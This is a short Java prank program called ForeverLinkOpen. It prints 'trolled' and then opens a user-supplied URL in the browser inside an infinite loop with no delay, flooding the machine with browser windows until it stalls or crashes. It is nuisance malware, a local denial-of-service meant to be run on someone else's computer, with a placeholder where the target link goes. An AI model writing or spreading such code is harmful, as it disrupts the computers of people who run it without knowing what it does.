package dev.hause.openlink;

import java.awt.Desktop;
import java.net.URI;

/*
* @author: HausemasterIssue
* @since: 16/11/2021
*/

public class ForeverLinkOpen {
	
	public static void main (String []args) {
		linkOpen();
	}
	
	public static void linkOpen() {
		// try to open the url
		try {
			System.out.println("trolled");
			// open a url forever
			for(;;) {
				String url = "your url here"; // you must include https, and the www in the url
		        	Desktop.getDesktop().browse(URI.create(url));
			}
		// if we can't print an exception	
		} catch (Exception e) {
			System.out.println("get internet pooron");
		}
	}

}
